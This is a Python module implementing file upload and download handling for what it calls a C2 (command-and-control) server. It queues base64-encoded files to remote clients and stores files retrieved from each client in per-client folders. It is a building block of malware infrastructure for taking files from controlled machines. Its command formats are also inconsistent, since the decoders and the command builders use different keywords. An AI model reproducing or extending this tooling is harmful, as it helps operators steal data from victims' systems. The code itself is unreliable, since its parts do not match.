import os
import base64
import json
import logging
from typing import Tuple, Optional, Dict, Any

logger = logging.getLogger('c2.filetransfer')

class FileTransfer:
    """Handles file uploads and downloads for C2 server"""
    
    def __init__(self, download_dir: str):
        self.download_dir = download_dir
        self._ensure_directory_exists(download_dir)
    
    def _ensure_directory_exists(self, directory: str) -> None:
        """Ensure the directory exists"""
        if not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
    
    def decode_download_command(self, command: str) -> Tuple[bool, str, Dict[str, Any]]:
        """Decode a download command to extract file path"""
        try:
            if command.startswith("download "):
                file_path = command[9:].strip()
                return True, file_path, {}
            return False, "", {}
        except Exception as e:
            logger.error(f"Error decoding download command: {e}")
            return False, "", {}
    
    def decode_upload_command(self, command: str) -> Tuple[bool, str, bytes]:
        """Decode an upload command to extract file path and content"""
        try:
            if command.startswith("upload "):
                # Format: upload <path>:<base64_content>
                params = command[7:].strip()
                path_idx = params.find(':')
                if path_idx == -1:
                    return False, "", b""
                    
                file_path = params[:path_idx].strip()
                content_b64 = params[path_idx+1:].strip()
                
                try:
                    content = base64.b64decode(content_b64)
                    return True, file_path, content
                except Exception as e:
                    logger.error(f"Error decoding file content: {e}")
                    return False, file_path, b""
            
            return False, "", b""
        except Exception as e:
            logger.error(f"Error decoding upload command: {e}")
            return False, "", b""
    
    def save_downloaded_file(self, client_id: str, filename: str, content: bytes) -> str:
        """Save a downloaded file"""
        try:
            # Create a directory for this client
            client_dir = os.path.join(self.download_dir, client_id)
            self._ensure_directory_exists(client_dir)
            
            # Extract just the basename to prevent directory traversal
            safe_filename = os.path.basename(filename)
            
            # Create the output path
            output_path = os.path.join(client_dir, safe_filename)
            
            # Save the file
            with open(output_path, 'wb') as f:
                f.write(content)
                
            logger.info(f"File saved: {output_path}")
            return output_path
            
        except Exception as e:
            logger.error(f"Error saving file: {e}")
            return None
    
    def prepare_upload_command(self, local_path: str, remote_path: str) -> Tuple[bool, str]:
        """Prepare an upload command for a file"""
        try:
            if not os.path.exists(local_path) or not os.path.isfile(local_path):
                return False, f"Local file not found: {local_path}"
                
            # Read the file
            with open(local_path, 'rb') as f:
                content = f.read()
                
            # Encode content as base64
            content_b64 = base64.b64encode(content).decode()
            
            # Create command
            command = f"upload_file {remote_path}:{content_b64}"
            
            return True, command
            
        except Exception as e:
            logger.error(f"Error preparing upload command: {e}")
            return False, f"Error: {str(e)}"
    
    def prepare_download_command(self, remote_path: str) -> str:
        """Prepare a download command for a file"""
        return f"download_file {remote_path}"
    
    def handle_download_response(self, client_id: str, response: str) -> Tuple[bool, str, str]:
        """Handle a response to a download command"""
        try:
            # Expected format: SUCCESS:<filename>:<base64_content> or ERROR:<message>
            if response.startswith("ERROR:"):
                return False, response[6:], ""
                
            if response.startswith("SUCCESS:"):
                parts = response[8:].split(":", 1)
                if len(parts) != 2:
                    return False, "Invalid response format", ""
                    
                filename = parts[0]
                content_b64 = parts[1]
                
                try:
                    content = base64.b64decode(content_b64)
                    saved_path = self.save_downloaded_file(client_id, filename, content)
                    return True, f"File downloaded: {saved_path}", saved_path
                except Exception as e:
                    return False, f"Error decoding file: {str(e)}", ""
            
            return False, "Unexpected response format", ""
            
        except Exception as e:
            logger.error(f"Error handling download response: {e}")
            return False, f"Error: {str(e)}", ""